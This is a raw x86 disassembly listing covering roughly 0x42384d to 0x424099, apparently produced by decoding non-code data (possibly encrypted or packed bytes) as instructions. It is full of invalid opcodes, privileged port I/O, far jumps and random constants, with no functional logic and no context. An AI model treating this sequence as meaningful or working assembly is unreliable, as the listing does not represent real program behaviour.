  42384d:	ret    0xc7d6
  423850:	(bad)  
  423851:	out    0xfd,al
  423853:	fsubrp st(4),st
  423855:	cli    
  423856:	sti    
  423857:	jmp    0xc1e9:0xe0cc0904
  42385e:	mov    dl,0xf2
  423860:	retf   
  423861:	lods   al,BYTE PTR ds:[esi]
  423862:	xlat   BYTE PTR ds:[ebx]
  423863:	into   
  423864:	sti    
  423865:	hlt    
  423866:	out    dx,eax
  423867:	std    
  423868:	mov    edi,0xd8ee03f6
  42386d:	fcomip st,st(5)
  42386f:	mov    ebp,0xc703c5bd
  423874:	std    
  423875:	fucomip st,st(6)
  423877:	out    0x4,eax
  423879:	fcmovbe st,st(3)
  42387b:	mov    edi,0xbcf7aed1
  423880:	mov    ah,0xb3
  423882:	ret    0xdff9
  423885:	hlt    
  423886:	in     al,dx
  423887:	(bad)  
  423888:	retf   
  423889:	repnz in al,dx
  42388b:	rcr    ecx,1
  42388d:	out    0xda,al
  42388f:	stc    
  423890:	ret    0x6e5
  423893:	(bad)  
  423894:	fmul   st(1),st
  423896:	fadd   st,st(4)
  423898:	fucomp st(1)
  42389a:	fcmove st,st(7)
  42389c:	test   al,0xe7
  42389e:	mov    ebp,0xcacad2e6
  4238a3:	mov    ebx,0xd8fec4f3
  4238a8:	shr    eax,1
  4238aa:	mov    ah,0x2
  4238ac:	hlt    
  4238ad:	std    
  4238ae:	mov    edi,0xe5b9e4e4
  4238b3:	lock or dh,ch
  4238b6:	enter  0x2fb,0xc4
  4238ba:	add    al,0xde
  4238bc:	sar    DWORD PTR [edi-0x521a4a0f],0xc7
  4238c3:	xlat   BYTE PTR ds:[ebx]
  4238c4:	mov    ebx,0xf9fec5c9
  4238c9:	enter  0xbffe,0xe8
  4238cd:	stc    
  4238ce:	ret    0xc406
  4238d1:	in     eax,0xd0
  4238d3:	or     ecx,ecx
  4238d5:	out    0x4,eax
  4238d7:	or     cl,bl
  4238d9:	int3   
  4238da:	loope  0x4238ba
  4238dc:	(bad)  
  4238de:	loop   0x4238d6
  4238e0:	repnz fld TBYTE PTR [eax-0x15080b28]
  4238e7:	retf   
  4238e8:	mov    ah,0xfb
  4238ea:	rcl    ch,1
  4238ec:	ret    0xe6c2
  4238ef:	in     al,dx
  4238f0:	mov    esp,0xe7dfdfd2
  4238f5:	jmp    0xdc11:0xfbddfaf8
  4238fc:	shr    BYTE PTR [ebp-0x24143730],cl
  423902:	shl    dh,cl
  423904:	lock imul bl
  423907:	iret   
  423908:	retf   0xddd7
  42390b:	aam    0xc3
  42390d:	mov    ebp,0xd4ffcdb4
  423912:	out    0xc2,eax
  423914:	fdivrp st(6),st
  423916:	or     al,BYTE PTR [esi]
  423918:	cld    
  423919:	or     edx,DWORD PTR [edx]
  42391b:	in     al,0xef
  42391d:	into   
  42391e:	lods   eax,DWORD PTR ds:[esi]
  42391f:	rcl    eax,0xd4
  423922:	in     eax,dx
  423923:	call   0xf41726dd
  423928:	hlt    
  423929:	aad    0xc2
  42392b:	aam    0x1
  42392d:	mov    eax,0xe5f9d0dd
  423932:	or     ecx,DWORD PTR [eax]
  423934:	inc    DWORD PTR [edx]
  423936:	add    ch,ah
  423938:	hlt    
  423939:	(bad)  
  42393a:	loopne 0x4238fc
  42393c:	test   eax,0xf1e4bdd0
  423941:	jecxz  0x4238fa
  423943:	mov    ah,0xd8
  423945:	mov    ecx,0xbfefb8f6
  42394a:	(bad)  
  42394b:	(bad)  
  42394d:	iret   
  42394e:	loope  0x42392b
  423950:	fcmovbe st,st(7)
  423952:	pop    es
  423953:	hlt    
  423954:	(bad)
  423957:	or     ebp,edi
  423959:	fmulp  st(2),st
  42395b:	ret    
  42395c:	call   0xd228f137
  423961:	loope  0x42391e
  423963:	lock stc 
  423965:	(bad)  [eax-0x1060903]
  42396b:	ret    
  42396c:	inc    DWORD PTR [edi]
  42396e:	sar    esi,0xc4
  423971:	out    0xea,al
  423973:	out    0xe9,eax
  423975:	enter  0xa05,0xe0
  423979:	or     al,0xe4
  42397b:	scas   eax,DWORD PTR es:[edi]
  42397c:	retf   
  42397d:	loopne 0x423955
  42397f:	out    0xef,al
  423981:	shr    ah,1
  423983:	stc    
  423984:	in     al,dx
  423985:	jmp    0x423933
  423987:	leave  
  423988:	mov    esp,0xdabdf1b8
  42398d:	repz add ebp,esp
  423990:	add    dl,dl
  423992:	stc    
  423993:	test   BYTE PTR [ebx],0xf4
  423996:	iret   
  423997:	iret   
  423998:	push   es
  423999:	jmp    esi
  42399b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42399c:	rcl    eax,0xe8
  42399f:	rol    bh,cl
  4239a1:	mov    ch,0xc2
  4239a3:	fdiv   DWORD PTR [ebp-0x234392d]
  4239a9:	out    dx,al
  4239aa:	cld    
  4239ab:	mov    ebx,0xe2bdc3c1
  4239b0:	loop   0x423991
  4239b2:	repnz cmc 
  4239b4:	(bad)  
  4239b5:	hlt    
  4239b6:	out    0x5,eax
  4239b8:	lds    eax,FWORD PTR [esi]
  4239ba:	in     al,0xe9
  4239bc:	loopne 0x423986
  4239be:	out    dx,al
  4239bf:	retf   0xeab2
  4239c2:	repz aad 0xe5
  4239c5:	xlat   BYTE PTR ds:[ebx]
  4239c6:	fidivr DWORD PTR [ebp-0x26370d36]
  4239cc:	aad    0xfc
  4239ce:	std    
  4239cf:	out    0x0,al
  4239d1:	ret    
  4239d2:	aam    0xe4
  4239d4:	stc    
  4239d5:	hlt    
  4239d6:	clc    
  4239d7:	std    
  4239d8:	or     ch,bl
  4239da:	add    ebp,DWORD PTR [ebx-0x1f183643]
  4239e0:	div    BYTE PTR [ebx-0x49180934]
  4239e6:	mov    ebx,0xe8cdd1ec
  4239eb:	loopne 0x4239e7
  4239ed:	(bad)  
  4239ee:	fcom   st(0)
  4239f0:	cmc    
  4239f1:	jmp    0x4239d3
  4239f3:	out    0xa,al
  4239f5:	loope  0x4239d0
  4239f7:	or     ecx,DWORD PTR [ebx]
  4239f9:	or     ecx,DWORD PTR [ecx+ebp*8]
  4239fc:	scas   al,BYTE PTR es:[edi]
  4239fd:	mov    al,0xbc
  4239ff:	rol    edx,1
  423a01:	rcl    ah,1
  423a03:	rol    al,1
  423a05:	lock mov ecx,0xd9dbbab9
  423a0b:	repz (bad) 
  423a0e:	loop   0x4239f7
  423a10:	rol    BYTE PTR [eax+esi*8],0xe2
  423a14:	in     eax,0xfe
  423a16:	fld    st(6)
  423a18:	fadd   st(1),st
  423a1a:	clc    
  423a1b:	test   eax,0xb5dce8de
  423a20:	shr    esi,0xb0
  423a23:	shl    esp,0xd4
  423a26:	jmp    0xf8d0:0xdfdadeb8
  423a2d:	add    bl,dh
  423a2f:	fsub   st,st(7)
  423a31:	repz jmp 0x4239fb
  423a34:	out    0xf6,eax
  423a36:	clc    
  423a37:	cli    
  423a38:	fsubr  st,st(1)
  423a3a:	in     eax,0xdf
  423a3c:	jmp    0x4239e7
  423a3e:	leave  
  423a3f:	lods   al,BYTE PTR ds:[esi]
  423a40:	mul    bh
  423a42:	mov    dh,0xf0
  423a44:	fcom   st(4)
  423a46:	out    dx,eax
  423a47:	(bad)
  423a4a:	mov    ecx,0xd9e7b9ee
  423a4f:	repnz mov edx,0xac6d7c7
  423a55:	add    al,0x4
  423a57:	call   0xe5361439
  423a5c:	(bad)  [eax-0x50b3b3d]
  423a62:	(bad)  
  423a63:	mov    ecx,0xdcefe7f3
  423a68:	call   0xf23d1762
  423a6d:	aad    0xc7
  423a6f:	(bad)  
  423a71:	(bad)  
  423a72:	or     esi,eax
  423a74:	les    eax,FWORD PTR [esi+ebp*8]
  423a77:	out    0xe0,eax
  423a79:	in     al,0x11
  423a7b:	lods   eax,DWORD PTR ds:[esi]
  423a7c:	mov    ebp,0xc8acb7c9
  423a81:	out    dx,eax
  423a82:	mov    ch,0xb0
  423a84:	repz mov bh,0xd1
  423a87:	into   
  423a88:	mov    dh,0x2
  423a8a:	mov    ebx,0xf7d4d303
  423a8f:	vpmulhw xmm3,xmm3,xmm5
  423a93:	lock stc 
  423a95:	(bad)  
  423a97:	jmp    0x423a85
  423a99:	(bad)  
  423a9b:	(bad)  
  423a9d:	(bad)  
  423a9e:	in     eax,dx
  423a9f:	(bad)  
  423aa0:	(bad)  
  423aa1:	call   0xae3d0693
  423aa6:	(bad)  
  423aa8:	mov    dl,0xd9
  423aaa:	shr    esp,cl
  423aac:	std    
  423aad:	sar    esi,1
  423aaf:	(bad)
  423ab2:	cli    
  423ab3:	add    eax,0x4dffe02
  423ab8:	loopne 0x423abd
  423aba:	ffreep st(4)
  423abc:	loop   0x423ab4
  423abe:	test   esi,0xd6d9c6fb
  423ac4:	shl    bh,cl
  423ac6:	call   0xfa3f2d9b
  423acb:	lock mov ecx,0x2f2c102
  423ad1:	std    
  423ad2:	or     eax,eax
  423ad4:	(bad)  
  423ad5:	add    edi,edi
  423ad7:	loop   0x423ad3
  423ad9:	loope  0x423aaa
  423adb:	(bad)  
  423add:	ret    0xe2ac
  423ae0:	sti    
  423ae1:	call   0xb7fb15b7
  423ae6:	fsubr  st,st(3)
  423ae8:	mov    ecx,0xf3f5d7fb
  423aed:	jecxz  0x423aab
  423aef:	mov    DWORD PTR [edx],0xf50907fc
  423af5:	jecxz  0x423af2
  423af7:	in     eax,dx
  423af8:	clc    
  423af9:	jmp    0xc3cb:0xd3d8a9e9
  423b00:	lods   al,BYTE PTR ds:[esi]
  423b01:	in     al,0xf2
  423b03:	mov    ebx,0xdef5f4f1
  423b08:	std    
  423b09:	jmp    0xdd1cfadc
  423b0e:	mov    esp,0xe4f5dfd4
  423b13:	(bad)
  423b16:	sti    
  423b17:	aad    0x6
  423b19:	fcmovu st,st(6)
  423b1b:	in     eax,dx
  423b1c:	enter  0xe2ad,0xc0
  423b20:	jmp    0xd6d6:0xeeb0b2d7
  423b27:	mov    ah,0xcd
  423b29:	in     al,dx
  423b2a:	xlat   BYTE PTR ds:[ebx]
  423b2b:	into   
  423b2c:	cld    
  423b2d:	ret    
  423b2e:	in     eax,dx
  423b2f:	xlat   BYTE PTR ds:[ebx]
  423b30:	idiv   ah
  423b32:	or     ebx,ebp
  423b34:	idiv   DWORD PTR [ebp+0x104cbe5]
  423b3a:	jmp    0x423af4
  423b3c:	mov    bh,0xe4
  423b3f:	(bad)  
  423b40:	(bad)  [edx-0x260a1216]
  423b46:	mov    ah,0xbd
  423b48:	int3   
  423b49:	jmp    ebx
  423b4b:	fcmovnu st,st(1)
  423b4d:	mul    al
  423b4f:	out    0x7,al
  423b51:	fadd   QWORD PTR [esi]
  423b53:	inc    al
  423b55:	out    dx,eax
  423b56:	or     esp,ebx
  423b58:	in     eax,0xd8
  423b5a:	or     ebp,ecx
  423b5c:	out    dx,eax
  423b5d:	not    edx
  423b5f:	shl    BYTE PTR [ebp+edx*8-0x16190d14],0xb4
  423b67:	in     eax,dx
  423b68:	cli    
  423b69:	enter  0xb7ed,0xd8
  423b6d:	out    dx,al
  423b6e:	rcr    esp,1
  423b70:	hlt    
  423b71:	shl    cl,0xf0
  423b74:	leave  
  423b75:	test   al,0xfc
  423b78:	(bad)  
  423b79:	into   
  423b7a:	adc    ch,cl
  423b7c:	rcr    esp,1
  423b7e:	loop   0x423b55
  423b80:	ror    bh,1
  423b82:	into   
  423b83:	out    0xf7,eax
  423b85:	rcr    ebp,cl
  423b87:	aad    0xf9
  423b89:	out    dx,al
  423b8a:	int3   
  423b8b:	test   bl,0xdf
  423b8e:	add    al,al
  423b90:	test   BYTE PTR [eax],0xe9
  423b93:	jmp    0x423b7c
  423b95:	in     al,0x9
  423b97:	(bad)  
  423b98:	fsub   st(2),st
  423b9a:	(bad)  
  423b9c:	test   al,0xac
  423b9e:	loopne 0x423b4d
  423ba0:	rol    eax,cl
  423ba2:	out    dx,al
  423ba3:	mov    dh,0xb2
  423ba5:	(bad)  
  423ba7:	clc    
  423ba8:	(bad)  
  423ba9:	jmp    0xf6c2:0xe3fed0b4
  423bb0:	cld    
  423bb1:	mov    esp,0xd6fbdebc
  423bb6:	dec    DWORD PTR [esi]
  423bb8:	int3   
  423bb9:	int    0x2
  423bbb:	mov    esi,0xe1d7b2d1
  423bc0:	lock int3 
  423bc2:	cmc    
  423bc3:	call   0xb437018f
  423bc8:	les    edi,FWORD PTR [edx-0x4a491637]
  423bce:	(bad)  
  423bd0:	(bad)  
  423bd2:	rol    ah,cl
  423bd4:	fsubp  st(6),st
  423bd6:	push   es
  423bd7:	add    esi,ebx
  423bd9:	jmp    edx
  423bdb:	into   
  423bdc:	mov    al,0xdd
  423bde:	leave  
  423bdf:	aad    0xd3
  423be1:	out    0xb5,al
  423be3:	(bad)
  423be6:	ror    bh,cl
  423be8:	int3   
  423be9:	mov    edx,0xc3ecf4da
  423bee:	mov    esp,0x7bde3d5
  423bf3:	fsub   st(1),st
  423bf5:	leave  
  423bf6:	aad    0xe0
  423bf8:	add    eax,0xbfef0d0c
  423bfd:	into   
  423bfe:	retf   0xd1ad
  423c01:	icebp  
  423c02:	int    0xdb
  423c04:	test   esi,0xddf4fbcf
  423c0a:	inc    dl
  423c0c:	hlt    
  423c0d:	int3   
  423c0e:	(bad)  
  423c10:	shl    edx,cl
  423c12:	or     edi,edx
  423c14:	inc    ebp
  423c16:	add    ebx,esi
  423c18:	out    0xe0,al
  423c1a:	call   0xb1282a02
  423c1f:	div    DWORD PTR [ebx+esi*8-0x340a1f27]
  423c26:	stc    
  423c27:	in     al,dx
  423c28:	lock clc 
  423c2a:	stc    
  423c2b:	add    edi,DWORD PTR [esi-0x452f41f9]
  423c31:	(bad)  
  423c33:	les    eax,FWORD PTR [ecx]
  423c35:	hlt    
  423c36:	out    dx,eax
  423c37:	out    dx,al
  423c38:	or     ah,dh
  423c3a:	std    
  423c3b:	fsubr  st(2),st
  423c3d:	test   ah,0xc6
  423c40:	icebp  
  423c41:	div    edx
  423c43:	retf   0xc6b6
  423c46:	stc    
  423c47:	aad    0xe9
  423c49:	shr    ebp,1
  423c4b:	mov    edi,0xdddff8c8
  423c50:	in     eax,0x1
  423c52:	sti    
  423c53:	cmc    
  423c54:	dec    DWORD PTR [edi]
  423c56:	cld    
  423c57:	out    0xf8,eax
  423c59:	rcr    esp,cl
  423c5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c5c:	(bad)  
  423c5d:	fcomip st,st(3)
  423c5f:	retf   
  423c60:	aad    0xd6
  423c62:	into   
  423c63:	int3   
  423c64:	lock retf 0xb6b5
  423c68:	mov    edi,0xbfefd8f2
  423c6d:	add    eax,esi
  423c6f:	loop   0x423c50
  423c71:	cli    
  423c72:	sar    bl,1
  423c74:	add    ch,bl
  423c76:	add    eax,0xea00d8e5
  423c7b:	out    0xe5,eax
  423c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c7e:	ret    0xc8e5
  423c81:	lods   eax,DWORD PTR ds:[esi]
  423c82:	mov    edx,0xd7fadbe9
  423c87:	jmp    0xe43f2d63
  423c8c:	fucomp st(5)
  423c8e:	fcmovnb st,st(6)
  423c90:	add    cl,bl
  423c92:	(bad)  
  423c94:	inc    al
  423c96:	enter  0xcb,0xce
  423c9a:	leave  
  423c9b:	retf   
  423c9c:	retf   
  423c9d:	ret    0xddf5
  423ca0:	leave  
  423ca1:	cmc    
  423ca2:	icebp  
  423ca3:	mov    al,0xc4
  423ca5:	mov    dh,0xce
  423ca7:	(bad)
  423caa:	mov    edx,0xd9c2def4
  423caf:	stc    
  423cb0:	rol    al,1
  423cb2:	fcmovb st,st(6)
  423cb4:	loopne 0x423cba
  423cb6:	(bad)  
  423cb7:	enter  0xaca,0xe4
  423cbb:	lock repnz icebp 
  423cbe:	rcl    ch,0xeb
  423cc1:	mov    bh,0xe6
  423cc3:	repnz (bad) 
  423cc5:	mov    ebx,0xf3dfffc5
  423cca:	cld    
  423ccb:	sti    
  423ccc:	(bad)  
  423ccd:	(bad)  
  423ccf:	cli    
  423cd0:	add    dh,dl
  423cd2:	jmp    0x423cb9
  423cd4:	lock fisttp QWORD PTR [edi]
  423cd7:	(bad)  
  423cd8:	out    dx,al
  423cd9:	add    ch,bh
  423cdb:	mov    bl,0xe1
  423cdd:	in     eax,0xf0
  423cdf:	repz (bad) 
  423ce1:	jmp    0xddd8:0xeed9c0ac
  423ce8:	jmp    0x423ca7
  423cea:	(bad)  
  423cec:	pop    es
  423ced:	fldz   
  423cef:	hlt    
  423cf0:	sti    
  423cf1:	ret    0xf0f6
  423cf4:	call   0x53b15b9
  423cf9:	add    ecx,ecx
  423cfb:	out    0xb8,eax
  423cfd:	fsubp  st(5),st
  423cff:	icebp  
  423d00:	shl    DWORD PTR [ecx-0x45302f2e],0xb5
  423d07:	mov    ebx,0xd4d9dede
  423d0c:	div    al
  423d0e:	hlt    
  423d0f:	(bad)  
  423d11:	xlat   BYTE PTR ds:[ebx]
  423d12:	jecxz  0x423d0d
  423d14:	add    cl,BYTE PTR [edi]
  423d16:	fcmove st,st(3)
  423d18:	sti    
  423d19:	enter  0xeae2,0xb1
  423d1d:	div    BYTE PTR [ebx-0x1e183553]
  423d23:	xlat   BYTE PTR ds:[ebx]
  423d24:	icebp  
  423d25:	out    dx,eax
  423d26:	leave  
  423d27:	mul    bl
  423d29:	fcmovb st,st(3)
  423d2b:	sar    bl,1
  423d2d:	ret    0xd302
  423d30:	stc    
  423d31:	sti    
  423d32:	rol    BYTE PTR [edx],0xd8
  423d35:	pop    es
  423d36:	test   bl,0xdd
  423d39:	jmp    0xc8330d2d
  423d3e:	enter  0xc6bc,0xe5
  423d42:	in     eax,0xb4
  423d44:	mov    ah,0xb4
  423d46:	enter  0xd4eb,0xfe
  423d4a:	ret    0xd7ff
  423d4d:	fst    st(1)
  423d4f:	rol    DWORD PTR [esi+eiz*8],0xb8
  423d53:	call   0xcf4e254c
  423d58:	(bad)  
  423d59:	paddsw mm5,QWORD PTR [edx+ecx*8-0x3328510e]
  423d61:	rol    cl,0xe0
  423d64:	(bad)  
  423d65:	(bad)  
  423d67:	icebp  
  423d68:	lock into 
  423d6a:	out    dx,al
  423d6b:	out    dx,eax
  423d6c:	repnz jecxz 0x423d31
  423d6f:	push   es
  423d70:	(bad)
  423d73:	rol    dl,0xde
  423d76:	std    
  423d77:	out    dx,eax
  423d78:	or     al,0xe8
  423d7a:	out    dx,eax
  423d7b:	mov    bl,0xce
  423d7d:	test   dl,0xcd
  423d80:	retf   0xd2d1
  423d83:	mov    cl,0xd5
  423d85:	lods   eax,DWORD PTR ds:[esi]
  423d86:	shr    ecx,1
  423d88:	jmp    0x423d75
  423d8a:	mov    ebp,0x1dbd2ff
  423d8f:	out    0x4,eax
  423d91:	inc    DWORD PTR [eax]
  423d93:	jecxz  0x423d9c
  423d95:	enter  0xcacb,0xd8
  423d99:	(bad)  
  423d9a:	fld1   
  423d9c:	fadd   st,st(4)
  423d9e:	jmp    0xc9e1:0xf6c1f5d4
  423da5:	jmp    0xe3cc:0xdcb8fefb
  423dac:	fadd   st,st(2)
  423dae:	ret    0xe004
  423db1:	jmp    0x423d84
  423db3:	in     al,0xdb
  423db5:	loopne 0x423da6
  423db7:	jmp    0xba2a3c98
  423dbc:	(bad)  
  423dbd:	out    0xac,eax
  423dbf:	scas   al,BYTE PTR es:[edi]
  423dc0:	fucomi st,st(5)
  423dc2:	call   0xb81c0d80
  423dc7:	in     eax,dx
  423dc8:	enter  0xd003,0xee
  423dcc:	(bad)  
  423dce:	rcl    ebp,cl
  423dd0:	in     al,dx
  423dd1:	sti    
  423dd2:	in     eax,0xeb
  423dd4:	push   es
  423dd5:	(bad)  
  423dd8:	add    ecx,ebx
  423dda:	fnstenv [ecx-0x949233c]
  423de0:	loopne 0x423dab
  423de2:	in     eax,dx
  423de3:	in     eax,0xb4
  423de5:	mov    eax,0xf4bbfab7
  423dea:	icebp  
  423deb:	rol    BYTE PTR [edi],cl
  423ded:	add    edx,edx
  423def:	cmc    
  423df0:	out    0xdb,eax
  423df2:	or     DWORD PTR [eax],eax
  423df4:	pop    es
  423df5:	add    BYTE PTR [ecx],al
  423df7:	out    0xfc,eax
  423df9:	out    0xfe,al
  423dfb:	enter  0xb1cd,0xf3
  423dff:	retf   
  423e00:	in     eax,dx
  423e01:	hlt    
  423e02:	fcmovnb st,st(1)
  423e04:	repnz mov eax,0xf9e3f3c8
  423e0a:	ret    
  423e0b:	hlt    
  423e0c:	div    ecx
  423e0e:	int    0xf0
  423e10:	(bad)  
  423e11:	loope  0x423dcb
  423e13:	call   0xe20e0df3
  423e18:	leave  
  423e19:	fdivr  st,st(5)
  423e1b:	(bad)  
  423e1c:	rol    ebx,1
  423e1e:	shr    ah,cl
  423e20:	out    0xd3,eax
  423e22:	aad    0xf7
  423e24:	mov    ch,0xce
  423e26:	mov    ah,0xdd
  423e28:	mov    dl,0xb9
  423e2a:	mov    al,0xfa
  423e2c:	mov    ebp,0x1d4b4fd
  423e31:	add    bl,cl
  423e33:	(bad)  [ebx]
  423e35:	loopne 0x423e19
  423e37:	jmp    0x423e3c
  423e39:	push   cs
  423e3a:	or     al,0xa8
  423e3c:	in     al,dx
  423e3d:	repz jmp 0x423e2a
  423e40:	imul   ecx
  423e42:	(bad)  
  423e43:	jmp    0x423e2c
  423e45:	hlt    
  423e46:	(bad)  
  423e47:	out    dx,al
  423e48:	fdivr  QWORD PTR [ebp-0x461e0b22]
  423e4e:	repz xlat BYTE PTR ds:[ebx]
  423e50:	(bad)  
  423e51:	jmp    edi
  423e53:	icebp  
  423e54:	in     eax,0x5
  423e56:	prefetch (bad)
  423e57:	or     eax,0xcf0301e1
  423e5c:	mov    dl,0xbf
  423e5e:	(bad)
  423e61:	call   0xe52f0d4d
  423e66:	mov    ecx,0xbaf4b4cf
  423e6b:	stc    
  423e6c:	xlat   BYTE PTR ds:[ebx]
  423e6d:	int3   
  423e6e:	add    edx,esp
  423e70:	mov    edx,0x3f80bd2
  423e75:	call   0xe23e4363
  423e7a:	jmp    0xb708fe57
  423e7f:	fucom  st(0)
  423e81:	lods   al,BYTE PTR ds:[esi]
  423e82:	out    dx,al
  423e83:	mov    ch,0xc5
  423e85:	fucomi st,st(0)
  423e87:	shr    ah,cl
  423e89:	retf   0xe9d4
  423e8c:	ret    0xc3ff
  423e8f:	shl    ecx,0xe4
  423e92:	in     eax,0x1
  423e94:	mov    esi,0x13e7e1e3
  423e99:	fstp   st(2)
  423e9b:	int    0xdc
  423e9d:	test   al,0xd5
  423e9f:	out    0xd5,eax
  423ea1:	mov    dh,0xa8
  423ea3:	scas   eax,DWORD PTR es:[edi]
  423ea4:	mov    ch,0xd4
  423ea6:	lods   al,BYTE PTR ds:[esi]
  423ea7:	mov    edx,0xd9bfdbf9
  423eac:	sar    esp,1
  423eae:	out    dx,al
  423eaf:	lock ret 
  423eb1:	not    eax
  423eb3:	add    BYTE PTR [eax],cl
  423eb5:	loope  0x423ea6
  423eb7:	ret    
  423eb8:	or     ebx,ecx
  423eba:	in     al,0xbf
  423ebc:	xlat   BYTE PTR ds:[ebx]
  423ebd:	loopne 0x423e91
  423ebf:	shl    BYTE PTR [esi+edx*8-0x2f25244b],cl
  423ec6:	mov    edx,0xbfddcafa
  423ecb:	fiadd  WORD PTR [ebx]
  423ecd:	neg    dl
  423ecf:	(bad)  
  423ed0:	(bad)  
  423ed1:	jecxz  0x423ece
  423ed3:	leave  
  423ed4:	add    ecx,eax
  423ed6:	add    ecx,esp
  423ed8:	fadd   DWORD PTR [edi]
  423eda:	add    edi,esp
  423edc:	in     al,dx
  423edd:	fsub   st(2),st
  423edf:	ret    0xe6e1
  423ee2:	mov    bh,0xda
  423ee4:	out    dx,al
  423ee5:	repz mov eax,0xdbd2eace
  423eeb:	cli    
  423eec:	fidiv  WORD PTR [ebp-0x23d2d12]
  423ef2:	(bad)  
  423ef4:	idiv   BYTE PTR [ebp-0x120b1013]
  423efa:	jmp    0xc8e80ff1
  423eff:	in     al,dx
  423f00:	retf   0xd9f0
  423f03:	repnz icebp 
  423f05:	fistp  QWORD PTR [eax-0x3c0e3741]
  423f0b:	loopne 0x423ecc
  423f0d:	mov    eax,0x5f6ed07
  423f12:	add    ch,dl
  423f14:	add    eax,0xdb08c701
  423f19:	adc    ebp,edi
  423f1b:	icebp  
  423f1c:	int3   
  423f1d:	lods   al,BYTE PTR ds:[esi]
  423f1e:	fmulp  st(0),st
  423f20:	jecxz  0x423ed6
  423f22:	out    dx,eax
  423f23:	clc    
  423f24:	xlat   BYTE PTR ds:[ebx]
  423f25:	cli    
  423f26:	test   bl,0x3
  423f29:	fstp   st(6)
  423f2b:	enter  0xbf03,0xc0
  423f2f:	(bad)  
  423f30:	(bad)  
  423f31:	stc    
  423f32:	fcmovb st,st(7)
  423f34:	enter  0x204,0xe
  423f38:	or     al,cl
  423f3a:	out    0xc7,al
  423f3c:	jecxz  0x423f15
  423f3e:	ror    al,cl
  423f40:	mov    ch,0xe1
  423f42:	mov    al,0xe6
  423f45:	mov    cl,0xb5
  423f47:	in     eax,dx
  423f48:	xlat   BYTE PTR ds:[ebx]
  423f49:	into   
  423f4a:	out    dx,al
  423f4b:	hlt    
  423f4c:	loop   0x423f4b
  423f4e:	mov    esi,0xfc02f7f8
  423f53:	xbegin 0xeb494443
  423f59:	shl    ecx,cl
  423f5b:	int    0xe0
  423f5d:	jmp    0xd4ba:0xfbc9c3ed
  423f64:	rcl    al,cl
  423f66:	mov    edi,0xcfbcffd2
  423f6b:	jmp    0xfe3f3a5e
  423f70:	div    ebx
  423f72:	mul    ch
  423f74:	fadd   DWORD PTR [esi]
  423f76:	loope  0x423f7a
  423f78:	jmp    0x423f42
  423f7a:	fdivr  QWORD PTR [eax-0x4d08213f]
  423f80:	hlt    
  423f81:	icebp  
  423f82:	xlat   BYTE PTR ds:[ebx]
  423f83:	shl    al,cl
  423f85:	enter  0xecf3,0xf8
  423f89:	rcr    dl,cl
  423f8b:	cli    
  423f8c:	mov    eax,0xf5ffd6f8
  423f91:	fcmovbe st,st(1)
  423f93:	add    ch,cl
  423f95:	add    al,0xeb
  423f97:	fcmovnb st,st(6)
  423f99:	pop    es
  423f9a:	loope  0x423f46
  423f9c:	ret    
  423f9d:	retf   
  423f9e:	shl    BYTE PTR [ecx-0x13283725],cl
  423fa4:	(bad)  
  423fa5:	in     al,dx
  423fa6:	in     eax,dx
  423fa7:	mov    edi,0xeeb403eb
  423fac:	in     al,dx
  423fad:	repz mov eax,0xc7f6c6f5
  423fb3:	ror    BYTE PTR [eax],1
  423fb5:	(bad)  
  423fb6:	out    dx,al
  423fb7:	in     al,0xa
  423fb9:	jmp    0xd6cb:0xceafa9ee
  423fc0:	ror    eax,0xf3
  423fc3:	ror    al,cl
  423fc5:	icebp  
  423fc6:	retf   0xbeb6
  423fc9:	(bad)  
  423fca:	int3   
  423fcb:	(bad)  
  423fcd:	push   es
  423fce:	xlat   BYTE PTR ds:[ebx]
  423fcf:	ret    
  423fd0:	loope  0x423fab
  423fd2:	add    bh,bl
  423fd4:	jmp    0x423fd1
  423fd6:	neg    dl
  423fd8:	push   cs
  423fd9:	(bad)  
  423fdb:	sar    DWORD PTR [edi-0x1f3c391e],0xc4
  423fe2:	repnz into 
  423fe4:	(bad)  
  423fe5:	mov    cl,0xbf
  423fe7:	retf   
  423fe8:	mov    edi,0xfceccd02
  423fed:	(bad)  
  423fee:	jecxz  0x423fcc
  423ff0:	(bad)  
  423ff2:	(bad)
  423ff5:	loopne 0x423fd1
  423ff7:	into   
  423ff8:	fdivr  st,st(0)
  423ffa:	or     al,0xbd
  423ffc:	fadd   st(5),st
  423ffe:	leave  
  423fff:	into   
  424000:	ret    0xcfe8
  424003:	retf   0xfaf1
  424006:	jmp    0x423fde
  424008:	mov    dl,0xbc
  42400a:	into   
  42400b:	lock in al,dx
  42400d:	out    dx,eax
  42400e:	cld    
  42400f:	fistp  QWORD PTR [ebp+0xe4fa02]
  424015:	out    0xe9,al
  424017:	push   es
  424018:	add    eax,DWORD PTR ds:0xb7eed1d2
  42401e:	shr    al,1
  424020:	ret    0xcccc
  424023:	repnz out 0xea,eax
  424026:	leave  
  424027:	in     eax,0xff
  424029:	into   
  42402a:	add    ebx,ebp
  42402c:	xlat   BYTE PTR ds:[ebx]
  42402d:	loopne 0x42401d
  42402f:	(bad)  
  424031:	out    0xe4,al
  424033:	loope  0x424016
  424035:	retf   0xd4c6
  424038:	aam    0xf2
  42403a:	or     al,0xea
  42403c:	jmp    0xebeb:0xcce9f6df
  424043:	loope  0x423ff3
  424045:	out    0xf1,eax
  424047:	not    esi
  424049:	fcmovnbe st,st(3)
  42404b:	add    eax,ebx
  42404d:	stc    
  42404e:	(bad)  
  424050:	(bad)  
  424051:	icebp  
  424052:	(bad)  
  424054:	loop   0x424025
  424056:	rol    BYTE PTR [esi],0x8
  424059:	retf   0xcd13
  42405c:	int3   
  42405d:	jmp    0x424003
  42405f:	test   ebx,0xd5f4c8db
  424065:	lods   eax,DWORD PTR ds:[esi]
  424066:	lods   al,BYTE PTR ds:[esi]
  424067:	in     eax,dx
  424068:	fnsave [ecx-0x3c30fd32]
  42406e:	int3   
  42406f:	fcomi  st,st(4)
  424071:	lock loop 0x424073
  424074:	in     eax,0xfb
  424076:	fdiv   st,st(5)
  424078:	sti    
  424079:	repz loop 0x424040
  42407c:	(bad)  
  42407e:	xlat   BYTE PTR ds:[ebx]
  42407f:	mov    esp,0xc1cfebc9
  424084:	jmp    0x424057
  424086:	shl    ah,1
  424088:	into   
  424089:	enter  0xccd5,0xfa
  42408d:	clc    
  42408e:	rol    esi,1
  424090:	sti    
  424091:	add    al,0xe9
  424093:	add    bl,ah
  424095:	leave  
  424096:	retf   0xe9dc
  424099:	or     eax,0xecddddd9
